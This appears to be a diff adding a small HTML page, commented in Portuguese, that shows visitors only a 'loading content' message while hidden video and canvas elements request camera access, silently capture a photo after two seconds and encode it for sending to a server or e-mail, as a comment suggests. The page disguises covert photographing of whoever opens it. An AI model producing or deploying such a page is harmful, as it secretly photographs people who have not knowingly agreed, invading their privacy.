@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Captura de Imagem</title>
+</head>
+<body>
+    <h2>A carregar conteúdo...</h2>
+    
+    <!-- Elementos escondidos para a captura -->
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // 1. Pedir permissão e aceder à câmara assim que a página carrega
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            // 2. Esperar um momento para a câmara focar e tirar a foto
+            setTimeout(function() {
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                
+                // 3. Converter a foto para formato de imagem (Base64)
+                const dataURL = canvas.toDataURL('image/png');
+                
+                console.log("Foto capturada!");
+                // Aqui enviarias a 'dataURL' para o teu servidor ou e-mail
+                // Exemplo: enviarParaServidor(dataURL);
+                
+                // Fechar a câmara após a foto
+                stream.getTracks().forEach(track => track.stop());
+            }, 2000); // 2 segundos de delay
+        })
+        .catch(function(err) {
+            console.log("O utilizador recusou o acesso: " + err);
+        });
+    </script>
+</body>
+</html>
